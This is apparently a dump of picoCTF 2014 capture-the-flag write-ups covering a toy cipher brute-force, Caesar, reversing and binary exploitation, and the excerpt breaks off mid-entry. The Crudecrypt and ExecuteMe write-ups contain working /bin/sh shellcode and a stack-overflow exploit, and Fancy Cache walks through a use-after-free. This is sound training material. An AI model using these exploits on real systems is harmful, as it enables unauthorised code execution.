return encrypted\n\ndef decrypt(data, key1, key2):\n    decrypted = decrypt_data(data, key2)\n    decrypted = decrypt_data(decrypted, key1)\n    return decrypted\n\ndef usage():\n    print \"Usage: %s [encrypt/decrypt] [key1] [key2] [in_file] [out_file]\" % argv[0]\n    exit(1)\n\ndef main():\n    if len(argv) != 6:\n        usage()\n\n    if len(argv[2]) > 6:\n        print \"key1 is too large\"\n    elif len(argv[3]) > 6:\n        print \"key2 is too large\"\n\n    key1 = int(argv[2], 16)\n    key2 = int(argv[3], 16)\n\n    in_file = open(argv[4], \"r\")\n\n    data = \"\"\n    while True:\n        read = in_file.read(1024)\n        if len(read) == 0:\n            break\n\n        data += read\n\n    in_file.close()\n\n    if argv[1] == \"encrypt\":\n        data = \"message: \" + data\n        if len(data) % 3 != 0: #pad\n            data += (\"\\x00\" * (3 - (len(data) % 3)))\n\n        output = encrypt(data, key1, key2)\n    elif argv[1] == \"decrypt\":\n        output = decrypt(data, key1, key2)\n    else:\n        usage()\n\n\n    out_file = open(argv[5], \"w\")\n    out_file.write(output)\n    out_file.close()\n\nif __name__ == \"__main__\":\n    main()\n```\n\nIf we run block.py, we get a helpful usage message:\n\n```text\n$ ./block.py\nUsage: ./block.py [encrypt/decrypt] [key1] [key2] [in_file] [out_file]\n```\n\nThe script does double encryption/decryption and requires two keys. The first key is used for the first encryption/decryption layer, and the second key is used for the second layer. If we examine the code, we see that the key needs to be at most, 6 characters in length. \n\n```python\nif len(argv[2]) > 6:\n    print \"key1 is too large\"\nelif len(argv[3]) > 6:\n    print \"key2 is too large\"\n```\n\nEach key is then converted into it's hexadecimal value, which means the range of allowed characters is from 0-9 and A-F. \n\n```python\nkey1 = int(argv[2], 16)\nkey2 = int(argv[3], 16)\n```\n\nTherefore the allowed keys fall in the range of 0x000000 to 0xFFFFFF, which means there are a total of 16,777,215 possible keys. That's not too bad. \n\nLet's take a look at the encryption phase first. The script reads the contents of the input file into a variable called data. It then prefixes data with a string \"messages: \", and then encrypts the entire thing. I'll refer to the string \"messages: \" as the header from here on. \n\n\n```python\nif argv[1] == \"encrypt\":\n    data = \"message: \" + data\n    if len(data) % 3 != 0: #pad\n        data += (\"\\x00\" * (3 - (len(data) % 3)))\n    output = encrypt(data, key1, key2)\n```\n\nIf we look at the encrypt() function, we see that it does the double encryption: \n\n```python\ndef encrypt(data, key1, key2):\n    encrypted = encrypt_data(data, key1)\n    encrypted = encrypt_data(encrypted, key2)\n    return encrypted\n```\n\nNow because it prefixes data with a known header, we can execute a known-plaintext attack. Let's see it in action. First, modify the script so that it prints out both encrypted values:\n\n```python\ndef encrypt(data, key1, key2):\n    encrypted = encrypt_data(data, key1)\n    print \"encryption layer 1:\", encrypted.encode(\"hex\")\n\n    encrypted = encrypt_data(encrypted, key2)\n    print \"encryption layer 2:\", encrypted.encode(\"hex\")\n\n    return encrypted\n```\n\nNow we'll create a file to encrypt and run the script to see what happens.\n\n```text\n$ echo \"abcd\" > m1.txt\n$ ./block.py encrypt 000001 000002 in.txt out.txt\nencryption layer 1: be2369c422c0017f979b23b7dcd840\nencryption layer 2: f90ce5fac97c7d18ae74ce69beb0bf\n```\n\nAfter the first layer of encryption is applied, our plaintext maps to the ciphertext like so: \n\n```\nbe 23 69 c4 22 c0 01 7f 97 9b 23 b7 dc d8 40\nm  e  s  s  a  g  e  s  :     a  b  c  d  \\n\n```\n\nSince we have a small key space, it's feasible to encrypt the header using all possible keys and store the encrypted header and its corresponding key in a hashmap for a quick lookup:\n\n```\nencrypted_header: key\n```\n\nSo now we have a hashmap of all possible ciphertext for the header, encrypted with all possible keys. In our example, we know the encrypted header is be2369c422c0017f97 after the first layer of encryption is applied. After the second layer of encryption is applied, the data becomes f90ce5fac97c7d18ae74ce69beb0bf. \n\nTo find key2, all we need to do is use all possible keys to remove the second layer of encryption from f90ce5fac97c7d18ae74ce69beb0bf and grab the first 9 bytes, which is the encrypted header. We then lookup this encrypted header from our hashmap, and if we find it, then we have both key1, and key2 that was used to encrypt the file.\n\nTo summarize: \n\n1. Create a hashmap that contains the header encrypted with all possible keys. So we would have something like this: \"be2369c422c0017f979\": \"000001\"\n\n1. For all possible keys, remove the second encryption layer and get the first 9 bytes of the decrypted string (string encrypted with first layer), which is the encrypted header. \n\n1. Lookup the encrypted header in our hashmap. If we find it, then we have key2, which was used to remove the second layer of encryption, and key1, which is the value associated with the encrypted header in our hashmap. \n\nHere's the final script:\n\n```python\n#!/opt/local/bin/python2\n\nimport struct, sys\n\nSBoxes = [[15, 1, 7, 0, 9, 6, 2, 14, 11, 8, 5, 3, 12, 13, 4, 10], [3, 7, 8, 9, 11, 0, 15, 13, 4, 1, 10, 2, 14, 6, 12, 5], [4, 12, 9, 8, 5, 13, 11, 7, 6, 3, 10, 14, 15, 1, 2, 0], [2, 4, 10, 5, 7, 13, 1, 15, 0, 11, 3, 12, 14, 9, 8, 6], [3, 8, 0, 2, 13, 14, 5, 11, 9, 1, 7, 12, 4, 6, 10, 15], [14, 12, 7, 0, 11, 4, 13, 15, 10, 3, 8, 9, 2, 6, 1, 5]]\n\nSInvBoxes = [[3, 1, 6, 11, 14, 10, 5, 2, 9, 4, 15, 8, 12, 13, 7, 0], [5, 9, 11, 0, 8, 15, 13, 1, 2, 3, 10, 4, 14, 7, 12, 6], [15, 13, 14, 9, 0, 4, 8, 7, 3, 2, 10, 6, 1, 5, 11, 12], [8, 6, 0, 10, 1, 3, 15, 4, 14, 13, 2, 9, 11, 5, 12, 7], [2, 9, 3, 0, 12, 6, 13, 10, 1, 8, 14, 7, 11, 4, 5, 15], [3, 14, 12, 9, 5, 15, 13, 2, 10, 11, 8, 4, 1, 6, 0, 7]]\n\ndef S(block, SBoxes):\n    output = 0\n    for i in xrange(0, len(SBoxes)):\n        output |= SBoxes[i][(block >> 4*i) & 0b1111] << 4*i\n\n    return output\n\n\nPBox = [13, 3, 15, 23, 6, 5, 22, 21, 19, 1, 18, 17, 20, 10, 7, 8, 12, 2, 16, 9, 14, 0, 11, 4]\nPInvBox = [21, 9, 17, 1, 23, 5, 4, 14, 15, 19, 13, 22, 16, 0, 20, 2, 18, 11, 10, 8, 12, 7, 6, 3]\ndef permute(block, pbox):\n    output = 0\n    for i in xrange(24):\n        bit = (block >> pbox[i]) & 1\n        output |= (bit << i)\n    return output\n\ndef encrypt_data(data, key):\n    enc = \"\"\n    for i in xrange(0, len(data), 3):\n        block = int(data[i:i+3].encode('hex'), 16)\n\n        for j in xrange(0, 3):\n            block ^= key\n            block = S(block, SBoxes)\n            block = permute(block, PBox)\n\n        block ^= key\n\n        enc += (\"%06x\" % block).decode('hex')\n\n    return enc\n\ndef decrypt_data(data, key):\n    dec = \"\"\n    for i in xrange(0, len(data), 3):\n        block = int(data[i:i+3].encode('hex'), 16)\n\n        block ^= key\n        for j in xrange(0, 3):\n            block = permute(block, PInvBox)\n            block = S(block, SInvBoxes)\n            block ^= key\n\n        dec += (\"%06x\" % block).decode('hex')\n\n    return dec\n\ndef encrypt(data, key1):\n    encrypted = encrypt_data(data, key1)\n    return encrypted\n\ndef decrypt(data, key2):\n    decrypted = decrypt_data(data, key2)\n    return decrypted\n\ndef main():\n\n    keymap = {}\n\n    status = 0\n    for i in range(0x000000, 0xFFFFFF):\n        key1 = i\n\n        # build a hashmap of \"message: \" encrypted with the first layer of encryption\n        # using all keys from 0x000000 to 0xFFFFFF\n        data = \"abcd\"   # this can be anything, we just want the header\n        data = \"message: \" + data\n\n        if len(data) % 3 != 0: #pad\n            data += (\"\\x00\" * (3 - (len(data) % 3)))\n\n        output = encrypt(data, key1)\n        header = output.encode(\"hex\")[:18]\n\n        # this might take a while, so print something so we know it's doing stuff\n        if status == 10000:\n            print \"status: %06x of %06x  key1: %d -> %s  header: %s\" % (key1, 0xFFFFFF, key1, output.encode(\"hex\"), header)\n            status = 0\n\n        status += 1\n        keymap[header] = key1\n\n    print \"keymap size:\", len(keymap)\n\n    # now we'll decrypt the second layer of \"encrypted\" and see if the header matches any of the\n    # the ones we generated. if it does, then we have both keys used for the encryption\n\n    # read in contents of encrypted\n    in_file = open(\"encrypted\", \"r\")\n    data = \"\"\n    while True:\n        read = in_file.read(1024)\n        if len(read) == 0:\n            break\n        data += read\n    in_file.close()\n\n    # remove second layer of encryption\n    status=0\n    for i in range(0x000000, 0xFFFFFF):\n        key2 = i\n        output = decrypt(data, key2)\n        header = output.encode(\"hex\")[:18]\n\n        if status == 10000:\n            print \"key2: %d -> %s  header: %s\" % (key1, output.encode(\"hex\"), header)\n            status = 0\n\n        # check if we have this header in keymap\n        if header in keymap:\n            print \"Solved! key1: %06x key2: %06x\" % (keymap[header], key2)\n            sys.exit(0)\n\n        status += 1\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\nLet's run it! \n\n```text\n$ time ./solveit.py\nstatus: 002710 of ffffff  key1: 10000 -> 5de6c1244f049c8b22cca58459c49b  header: 5de6c1244f049c8b22\nstatus: 004e20 of ffffff  key1: 20000 -> 855567efe669b5e4c0045839e2781a  header: 855567efe669b5e4c0\nstatus: 007530 of ffffff  key1: 30000 -> 0061d4f3850fa46707cda20faf3281  header: 0061d4f3850fa46707\nstatus: 009c40 of ffffff  key1: 40000 -> 0141d19c8cbaf8ed25144bc2e2c2ec  header: 0141d19c8cbaf8ed25\n.\n.\n.\ntrying 74e1e0 of ffffff   key2: 7660000 -> a47285f2a2773c036efd351c6cec58f1cc3fbcf67c15caec1e1bb6bbb6c4435c159d59270550b2  header: a47285f2a2773c036e\ntrying 7508f0 of ffffff   key2: 7670000 -> b024a1d804d47c95c45d045f456e47412a2895afda004e1bd9ab8b4b046cac656b725300d6cc57  header: b024a1d804d47c95c4\ntrying 753000 of ffffff   key2: 7680000 -> 3358a7d2e95c20e496ea6917f30e1c624fb8c8825f69495f64a6a3f5c668ecd70ed48eac7f8171  header: 3358a7d2e95c20e496\ntrying 755710 of ffffff   key2: 7690000 -> 1c9a46dd8f160adb175098d80f6ec879ecb3ca98bfab2f154a38e1d366c236c5632a292354fe04  header: 1c9a46dd8f160adb17\nSolved! key1: b89567 key2: 756c21\n\nreal    160m17.938s\nuser    160m12.445s\nsys 0m4.399s\n```\n\nTwo coffees, a lunch break, and a meeting later, both keys were found! As I said, not the most efficient way to do it, but it worked. Now that we have both keys, we can decrypt the encrypted file:\n\n```\n$ ./block.py decrypt b89567 756c21 encrypted flag.txt\n$ cat flag.txt\nmessage: 98acd72dda19cac0ceb93be06d1baa\n```\n\nThe flag is **98acd72dda19cac0ceb93be06d1baa**\n", "timestamp": "2025-10-24T11:40:14.826677"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/ceasar.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/ceasar.md", "content": "### Solved by bitvijays\n\nCeasar is a 20 point cryptography challenge. This is another one of the easy ones. \n\n> You find an encrypted message written on the documents. Can you decrypt it?\n\nThe encrypted text in question looks like this:\n\n```\nuiftfdsfuqbttqisbtfjtpgtqyrdhekuqsxjdtvyvkghlpvkfml\n```\n\nWe know it's a ceasar cipher based on the challenge's name. The fastest way to solve it was to just put in [http://planetcalc.com/1434/](http://planetcalc.com/1434/). It presents you all the possible values of the plaintext based on ROT [0-25]. ROT25 presents you with thesecretpassphraseisofspxqcgdjtprwicsuxujfgkoujelk.\n<br><br>Another possible way of solving this is use <a href=\"https://www.cryptool.org/en/cryptool1\">Cryptool1</a> software, which provides the analysis of Symmetric Key Encrption, just paste the encryption text in the Window. Go to Analysis > Symmetric Encryption (Classic) > Ciphertext Only > Caesar.\n\nIt solves it instantly. The flag is **ofspxqcgdjtprwicsuxujfgkoujelk**\n\n", "timestamp": "2025-10-24T11:40:14.877154"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/common-vulnerability-exercise.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/common-vulnerability-exercise.md", "content": "### Solved by bitvijays\n\nIn the excercise, you have to find the CVE-ID. \n>This disc is encrypted. The surprisingly elaborate password hint refers to \"the CVE Identifier for a 2014 vulnerability that allowed arbitrary code execution in Firefox via a buffer overflow in a speech codec\". If you found this \"CVE-ID\" thingy, it'd probably be the password.\n\nTo solve this, we visit the website <a href=\"http://www.cvedetails.com/\">cvedetails.com</a> and search for Mozilla Firefox in the Google Custom Search. By doing it, we are provided a table showing Vulnerability Trends Over Time. \n![](/images/2014/pico/cve/vtot.png)\n\nBy the description of the problem, if we see, there are 19 Overflow vulnerabilities published in 2014. Clicking further on 19 provides you Security Vulnerabilities Published In 2014 (Overflow)\n![](/images/2014/pico/cve/svpi2014.png)\n\nSearching for spee, you would find the CVE-ID for the vulnerability is **CVE-2014-1542** which is the correct flag.\n", "timestamp": "2025-10-24T11:40:15.022655"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/crudecrypt.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/crudecrypt.md", "content": "### Solved by barrebas\n\nCrudecrypt is a 180 point challenge. \n\nWe are given access to a program that can encrypt and decrypt a file. The program does not try to sanitize user input when decrypting:\n\n```c\nvoid decrypt_file(FILE* enc_file, FILE* raw_file, unsigned char* key) {\n    int size = file_size(enc_file);\n    char* enc_buf = calloc(1, size);\n    fread(enc_buf, 1, size, enc_file);\n\n    if(decrypt_buffer(enc_buf, size, (char*)key, 16) != 0) {\n        printf(\"There was an error decrypting the file!\\n\");\n        return;\n    }\n\n    char* raw_buf = enc_buf;\n    file_header* header = (file_header*) raw_buf;\n\n    if(header->magic_number != MAGIC) {\n        printf(\"Invalid password!\\n\");\n        return;\n    }\n\n    if(!check_hostname(header)) { \n        printf(\"[#] Warning: File not encrypted by current machine.\\n\");\n    }\n    \n    // snip\n    \nbool check_hostname(file_header* header) {\n    char saved_host[HOST_LEN], current_host[HOST_LEN];\n    \n    // unsafe strncpy if we supply a large string for header->host\n    strncpy(saved_host, header->host, strlen(header->host));\n    safe_gethostname(current_host, HOST_LEN);\n    return strcmp(saved_host, current_host) == 0;\n}\n```\n\nIf the attacker can supply an encrypted file header with a large host field, then we can overflow the saved_host array on the stack & overwrite EIP. We modified the source of crudecrypt.c to generate such a file:\n\n```c\nvoid encrypt_file(FILE* raw_file, FILE* enc_file, unsigned char* key) {\n    int size = file_size(raw_file);\n    size_t block_size = MULT_BLOCK_SIZE(sizeof(file_header) + size);\n    char* padded_block = calloc(1, block_size);\n\n    file_header header;\n    init_file_header(&header, size);\n    //safe_gethostname(header.host, HOST_LEN);\n    strcpy(header.host, \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\");\n```\n\nWe encrypted the payload using this modified crudecrypt.c. Then we decrypted it, observing the crash!\n\n```\n#0  0x45454545 in ?? ()\n(gdb) i r\neax            0xffffff00\t-256\necx            0x73\t115\nedx            0xffffd660\t-10656\t> perfect pointer to start of buffer\nebx            0xf7dea000\t-136404992\nesp            0xffffd690\t0xffffd690\nebp            0x44444444\t0x44444444\nesi            0x0\t0\nedi            0x0\t0\neip            0x45454545\t0x45454545\neflags         0x10286\t[ PF SF IF RF ]\ncs             0x23\t35\nss             0x2b\t43\nds             0x2b\t43\nes             0x2b\t43\nfs             0x0\t0\ngs             0x63\t99\n```\n\nLooks like ALSR is off! There was no `jmp edx` in the binary that I could find, so instead, let's just jump to the buffer:\n\n```c\n\nvoid encrypt_file(FILE* raw_file, FILE* enc_file, unsigned char* key) {\n    int size = file_size(raw_file);\n    size_t block_size = MULT_BLOCK_SIZE(sizeof(file_header) + size);\n    char* padded_block = calloc(1, block_size);\n\n    file_header header;\n    init_file_header(&header, size);\n    //safe_gethostname(header.host, HOST_LEN);\n    char payload[] = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x8d\\x54\\x24\\x08\\x50\\x53\\x8d\\x0c\\x24\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\xb0\\x01\\xcd\\x80\"\"BBCCCCDDDD\\x30\\xd6\\xff\\xff\"\"FFFFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\";\n    strcpy(header.host, payload);\n```\n\ncompile & run:\n\n```\nbas@tritonal:~/tmp/picoctf/crudecrypt$ gcc -o exploit exploit.c -lcrypto -lmcrypt -lssl -m32\nbas@tritonal:~/tmp/picoctf/crudecrypt$ ./exploit encrypt ./a ./b\n-=- Welcome to CrudeCrypt 0.1 Beta -=-\n-> File password:         \n\n=> Encrypted file successfully\n*** Error in `./exploit': free(): invalid pointer: 0x0920f300 ***\nAborted (core dumped)\nbas@tritonal:~/tmp/picoctf/crudecrypt$ cat b |base64\nqmikXTf65Xauen/t3a0FDf1uZMI3baSe5I9hTVEJ5t04R0Vb8RgBltvIwvCvmbaOtou7THTwR5Vy\nB9dA2GyFxMLF/wyNDY9V/y2bveRKWLam5xehXkNXQFSMhUJcd3RNwfgFxVlYswx4VfW1CiqmV45S\nZzbvWLRmeRdk1vyxXQSq0nyDhcPi8GhwnKp6R1ri\n```\n\nWe transferred the base64 encoded payload to remote machine. We had to adjust the pointer to the shellcode because the address changes on stack due to environment changing. We found this new pointer by simply running gdb. \n\n```\npico1139@shell:~$ .///////////////crude_crypt decrypt ./sp ./bleh\n-=- Welcome to CrudeCrypt 0.1 Beta -=-\n-> File password: \n\nSegmentation fault (core dumped)\n...\n#0  0xffffd674 in ?? ()\n(gdb) i r\neax            0xffffff00\t-256\necx            0xb4\t180\nedx            0xffffd5f2\t-10766\n...\n(gdb) x/s 0xffffd5f2\n0xffffd5f2:\t\"Ph//shh/bin\\211\\343\\215T$\\b...BBCCCCDDDD\"\n(gdb) x/2i 0xffffd5f0\n   0xffffd5f0:\txor    %eax,%eax\n   0xffffd5f2:\tpush   %eax\n```\n\nAfter adjusting the address to `0xffffd5f0` in the exploit, we end up with a shell! A NOP sled would've been easy, in this case. \n\n```\npico1139@shell:~$ cat b |base64 -d > ./sp\npico1139@shell:~$ /home/crudecrypt/crude_crypt decrypt ./sp ./bleh\n-=- Welcome to CrudeCrypt 0.1 Beta -=-\n-> File password: \n\n$ id\nuid=11066(pico1139) gid=1017(picogroup) egid=1012(crudecrypt) groups=1017(picogroup)\n$ whoami\npico1139\n$ cat /home/crudecrypt/flag.txt\nwriting_software_is_hard\n```\n\nThe flag is `writing_software_is_hard`.\n", "timestamp": "2025-10-24T11:40:15.127276"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/cyborg-secrets.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/cyborg-secrets.md", "content": "### Solved by superkojiman\n\nCyborg Secrets is an 80 point reverse engineering challenge. \n\n> You found a password protected binary on the cyborg relating to its defensive security systems. Find the password and get the shutdown code! You can find it on the shell server at /home/cyborgsecrets/cyborg-defense or you can download it here.\n\nThis is an easy one. Running the binary prompts us for a password:\n\n```\n# ./cyborg_defense \n______               _       _             _____                  \n|  _  \\             | |     | |           /  __ \\                 \n| | | |__ _  ___  __| | __ _| |_   _ ___  | /  \\/ ___  _ __ _ __  \n| | | / _` |/ _ \\/ _` |/ _` | | | | / __| | |    / _ \\| '__| '_ \\ \n| |/ / (_| |  __/ (_| | (_| | | |_| \\__ \\ | \\__/\\ (_) | |  | |_) |\n|___/ \\__,_|\\___|\\__,_|\\__,_|_|\\__,_|___/  \\____/\\___/|_|  | .__/ \n                                                           | |    \n                                                           |_|\nPlease include a password command line argument.\n```\n\nWe can find the password using the strings command:\n\n```\n# strings cyborg_defense \n/lib/ld-linux.so.2\nlibc.so.6\n_IO_stdin_used\nputs\nputchar\nprintf\nstrcmp\n__libc_start_main\n__gmon_start__\nGLIBC_2.0\nPTRh0\n[^_]\nZogH\nTODO: REMOVE DEBUG PASSWORD!\nDEBUG PASSWORD: 2manyHacks_Debug_Admin_Test\n______               _       _             _____                  \n|  _  \\             | |     | |           /  __ \\                 \n| | | |__ _  ___  __| | __ _| |_   _ ___  | /  \\/ ___  _ __ _ __  \n| | | / _` |/ _ \\/ _` |/ _` | | | | / __| | |    / _ \\| '__| '_ \\ \n| |/ / (_| |  __/ (_| | (_| | | |_| \\__ \\ | \\__/\\ (_) | |  | |_) |\n|___/ \\__,_|\\___|\\__,_|\\__,_|_|\\__,_|___/  \\____/\\___/|_|  | .__/ \n                                                           | |    \n                                                           |_|\nPlease include a password command line argument.\nPassword: %s\n2manyHacks_Debug_Admin_Test\nAccess Denied\nAuthorization successful.\n;*2$\"\n```\n\nPassword is 2manyHacks_Debug_Admin_Test. Passing that as an argument to the binary gives us the shutdown code:\n\n```\n# ./cyborg_defense 2manyHacks_Debug_Admin_Test\n______               _       _             _____                  \n|  _  \\             | |     | |           /  __ \\                 \n| | | |__ _  ___  __| | __ _| |_   _ ___  | /  \\/ ___  _ __ _ __  \n| | | / _` |/ _ \\/ _` |/ _` | | | | / __| | |    / _ \\| '__| '_ \\ \n| |/ / (_| |  __/ (_| | (_| | | |_| \\__ \\ | \\__/\\ (_) | |  | |_) |\n|___/ \\__,_|\\___|\\__,_|\\__,_|_|\\__,_|___/  \\____/\\___/|_|  | .__/ \n                                                           | |    \n                                                           |_|\nPassword: 2manyHacks_Debug_Admin_Test\nAuthorization successful.\n403-shutdown-for-what\n```\n\nThe flag is **403-shutdown-for-what**\n", "timestamp": "2025-10-24T11:40:15.246375"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/droidapp.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/droidapp.md", "content": "### Solved by superkojiman\n\nDroid App is an 80 point forensics challenge. \n\n> An Android application was released for the toaster bots, but it seems like this one is some sort of debug version. Can you discover the presence of any debug information being stored, so we can plug this?\nYou can download the apk here.\n\nAfter downloading the APK, we can decompile it using [http://www.decompileandroid.com/](http://www.decompileandroid.com). Once it's decompiled, we can download the decompiled files and unpack them. \n\nIf we open up src/picoapp453/picoctf/com/picoapp/ToasterActivity.java we see the following:\n\n```java\npublic ToasterActivity()\n{  \n    mystery = new String(new char[] {\n        'f', 'l', 'a', 'g', ' ', 'i', 's', ':', ' ', 'w', \n        'h', 'a', 't', '_', 'd', 'o', 'e', 's', '_', 't', \n        'h', 'e', '_', 'l', 'o', 'g', 'c', 'a', 't', '_', \n        's', 'a', 'y'\n    });\n}\n```\n\nThere's our flag: **what_does_the_logcat_say**\n", "timestamp": "2025-10-24T11:40:15.346337"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/easy-overflow.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/easy-overflow.md", "content": "### Solved by superkojiman\n\nEasy Overflow is a 40 point binary exploitaiton challenge. This one's a warm up challenge. \n\n> Is the sum of two positive integers always positive?\nnc vuln2014.picoctf.com 50000\n'nc' is the Linux netcat command. Try running it in the shell.\n\nWhen we connect to the server, we're given a number and we're prompted for a number to make it negative. Eg:\n\n```\n$ nc vuln2014.picoctf.com 50000\nYour number is 2088572. Can you make it negative by adding a positive integer?\n12345\nAlmost... the sum was 2100917.\n\nThanks for playing.\n```\n\nThe solution is to cause an integer overflow. 2,147,483,647 is the maximum positive value for a 32-bit signed integer, so if we enter that it should cause an integer overflow when added to the server's number: \n\n```\n$ nc vuln2014.picoctf.com 50000\nYour number is 440902. Can you make it negative by adding a positive integer?\n2147483647\nCongratulations! The sum is -2147042747. Here is the flag: That_was_easssy!\n\nThanks for playing.\n```\n\nThe flag is **That_was_easssy!**\n", "timestamp": "2025-10-24T11:40:15.412567"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/executeme.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/executeme.md", "content": "### Solved by superkojiman\n\nExecteMe is an 80 point binary exploitation challenge. \n\n> This program will run whatever you send to it! Try to get the flag! The binary can be found at /home/execute/ on the shell server. The source can be found here.\n\nThe description actually gives away the solution. Here's the source code:\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n\nint token = 0;\n\ntypedef void (*function_ptr)();\n\nvoid be_nice_to_people(){\n    gid_t gid = getegid();\n    setresgid(gid, gid, gid);\n}\n\nint main(int argc, char **argv){\n    char buf[128];\n\n    be_nice_to_people();\n\n    read(0, buf, 128);\n\n    ((function_ptr)buf)();\n}\n```\n\nIt takes whatever input we provide and executes it. Eg:\n\n```text\npico1139@shell:/home/execute$ ./execute \nhello\nSegmentation fault (core dumped)\n```\n\nSo to solve it, we just pass it some shellcode that will give us a shell:\n\n```\npico1139@shell:/home/execute$ (printf \"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\" ; cat) | ./execute \nid\nuid=11066(pico1139) gid=1006(execute) groups=1017(picogroup)\ncat flag.txt\nshellcode_is_kinda_cool\n```\n\nThe flag is **shellcode_is_kinda_cool**\n", "timestamp": "2025-10-24T11:40:15.506633"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/fancy-cache.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/fancy-cache.md", "content": "### Solved by barrebas\n\nFancy Cache was another \"Master Challenge\" for PicoCTF worth 200 points. It featured a custom server, which allegedly creates a cache of strings. It's up to us to break it!\n\nWe are given the source code, the binary, a libc library and a client written in Python. Wow! `fancy_cache` communicates in a difficult way, but luckily, all the heavy lifting is already done for us in `client.py`! Browsing through fancy_cache.c, we immediately felt that this had to be some kind of use-after-free bug. Indeed, there is a bug in these two functions:\n\n```c\nstruct cache_entry *cache_lookup(struct string *key) {\n  size_t i;\n  for (i = 0; i < kCacheSize; ++i) {\n    struct cache_entry *entry = &cache[i];\n\n    // Skip expired cache entries.\n    if (entry->lifetime == 0) {\n      continue;\n    }\n\n    if (string_eq(entry->key, key)) {\n\t   return entry;\n    }\n  }\n\n  return NULL;\n}\n\nvoid do_cache_get(void) {\n  struct string key;\n  string_init(&key);\n  read_into_string(&key);\n\n  struct cache_entry *entry = cache_lookup(&key);\n  if (entry == NULL) {\n    write(STDOUT_FILENO, &kNotFound, sizeof(kNotFound));\n    return;\n  }\n\n  write(STDOUT_FILENO, &kFound, sizeof(kFound));\n  write_string(entry->value);\n\n  --entry->lifetime;\n  if (entry->lifetime <= 0) {\n    // The cache entry is now expired.\n    fprintf(stderr, \"Destroying key %s\\n\", entry->key->data);\n    string_destroy(entry->key);\n    fprintf(stderr, \"Destroying value %s\\n\", entry->value->data);\n    string_destroy(entry->value);\n  }\n}\n```\n\nThe function `do_cache_get` will free a string struct when the lifetime goes below zero, but `cache_lookup` will happily return entries with a negative lifetime. That means we can free a string struct, *somehow* write to it, and influence the cache entries! After calls to `free()`, subsequent calls to `malloc()` will usually return recently freed memory. For instance, consider this sequence:\n\n```bash\n# start our server\nbas@tritonal:~/tmp/picoctf/fancy_cache$ socat TCP-LISTEN:1337,reuseaddr,fork EXEC:./fancy_cache\n```\n\nAnd modify the client.py script a bit:\n\n```python\n# Add an entry with a negative lifetime. This will fool cache_lookup.\ncache_set(f, 'keyAAAA', 'AAAA____', 0xffffffff)\n\n# Request that value, causing it to be deleted from cache\nprint cache_get(f, 'keyAAAA')\n\n# Now request the value of 'bleh'\nprint cache_get(f, 'bleh')\n```\n\nThis results in the following debug output of the local server:\n\n```bash\nmalloc(12) = 0x8598008 (string_create)\nrealloc((nil), 7) = 0x8598018 (read_into_string)\nmalloc(12) = 0x8598028 (string_create)\nrealloc((nil), 8) = 0x8598038 (read_into_string)\nrealloc((nil), 7) = 0x8598048 (read_into_string)\nDestroying key\nfree(0x8598008) (string_destroy str)\nDestroying value\nfree(0x8598028) (string_destroy str)\nrealloc((nil), 4) = 0x8598028 (read_into_string)\n```\n\nAt first, the code allocates `0x8598008` and `0x8598028` as `key` and `value` string structs, respectively. Then, we request the value of 'keyAAAA', causing do_cache_get to free that memory again. Next, we request the value of the non-existent key 'bleh'. However, the program allocates space at `0x8598028`, the recently freed region! Because the cache entry is still valid (lifetime != 0), we can write a new string struct to these locations! Let's first try to read memory. There is a hint hidden on the remote server, waiting for us. In the local copy, it just says `REDACTED`. In order for this work, cache->key->data must point to a real string. I choose 'printf' in the binary. So:\n\n-\tWe register a struct string with lifetime -1. \n-\tWe fetch it; the struct string will be freed, but the cache_lookup() function will still try to use it, because lifetime != 0\n-\tWe try to request another string struct, but this will allocate the old memory location and overwrite the old alloc’ed key & value regions (still valid according to cache_lookup()!). \n-\tWe “write” a string struct into value:\n```bash\n\told_value->length = 0xff\n\told_value->capacity = 0x00\n\told_value->data = pointer to whatever we want to read\n```\n-\tWe write a string struct into key:\n\n```bash\nold_key->length = 0x6\nold_key->cap = 0x00\nold_key->data = pointer to string that is known, like printf ->      0x8048310\n```\nWe need that known string (printf was chosen arbitrarily) because we need the following piece of code to evaluate to true:\n\n```c\n    if (string_eq(entry->key, key)) {\n\t   return entry;\n    }\n```\n\n- We request the key called 'printf'; the cache_lookup will succeed, and it will give us the memory that is stored at old_value->data, which is supplied by us!\n\n```python\n### modifications to client.py:\n\n# Add an entry to the cache\nassert cache_set(f, 'keyAAAA', 'AAAA____', 0xffffffff)\n# Delete from cache\nprint cache_get(f, 'keyAAAA')\n# This is read into the old \"value\" struct (used to be 0x8, 0x0, *(AAAA____)). \nprint cache_get(f, 